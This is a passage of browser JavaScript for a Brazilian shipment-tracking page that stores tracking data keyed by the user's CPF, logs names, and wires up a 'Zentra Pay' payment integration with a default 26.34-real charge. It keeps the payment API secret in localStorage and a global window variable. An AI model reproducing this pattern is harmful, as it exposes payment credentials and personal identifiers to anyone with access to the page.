            const keys = Object.keys(localStorage);
            keys.forEach(key => {
                if (key.startsWith('tracking_')) {
                    localStorage.removeItem(key);
                }
            });
        } catch (error) {
            console.error('Erro ao limpar dados antigos:', error);
        }
    }

    saveTrackingData() {
        if (!this.currentCPF || !this.trackingData) return;
        
        try {
            localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
        } catch (error) {
            console.error('Erro ao salvar dados:', error);
        }
    }

    getFirstAndLastName(fullName) {
        const nameParts = fullName.trim().split(' ');
        console.log('🔍 Processando nome completo:', fullName);
        console.log('🔍 Nomes separados:', nameParts);
        
        if (nameParts.length === 1) {
            console.log('✅ Nome único encontrado:', nameParts[0]);
            return nameParts[0];
        }
        
        const result = `${nameParts[0]} ${nameParts[nameParts.length - 1]}`;
        console.log('✅ Nome processado:', result);
        return result;
    }

    updateElement(elementId, text) {
        console.log(`🔄 Tentando atualizar elemento '${elementId}' com texto:`, text);
        
        const element = document.getElementById(elementId);
        if (element) {
            const previousText = element.textContent;
            element.textContent = text;
            console.log(`✅ Elemento '${elementId}' atualizado:`);
            console.log(`   Texto anterior: "${previousText}"`);
            console.log(`   Texto novo: "${text}"`);
        } else {
            console.error(`❌ Elemento '${elementId}' não encontrado no DOM`);
            console.log('🔍 Elementos disponíveis:', Array.from(document.querySelectorAll('[id]')).map(el => el.id));
        }
    }

    showElement(elementId) {
        const element = document.getElementById(elementId);
        if (element) {
            element.style.display = 'block';
        }
    }

    setZentraPayApiSecret(apiSecret) {
        const success = this.zentraPayService.setApiSecret(apiSecret);
        if (success) {
            console.log('✅ API Secret Zentra Pay configurada com sucesso');
        } else {
            console.error('❌ Falha ao configurar API Secret Zentra Pay');
        }
        return success;
    }
}

// Função global para configurar API Secret
window.setZentraPayApiSecret = function(apiSecret) {
    if (window.trackingSystemInstance) {
        return window.trackingSystemInstance.setZentraPayApiSecret(apiSecret);
    } else {
        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
        localStorage.setItem('zentra_pay_secret_key', apiSecret);
        console.log('🔑 API Secret armazenada para uso posterior');
        return true;
    }
};

// Configurar valor padrão
window.valor_em_reais = 26.34;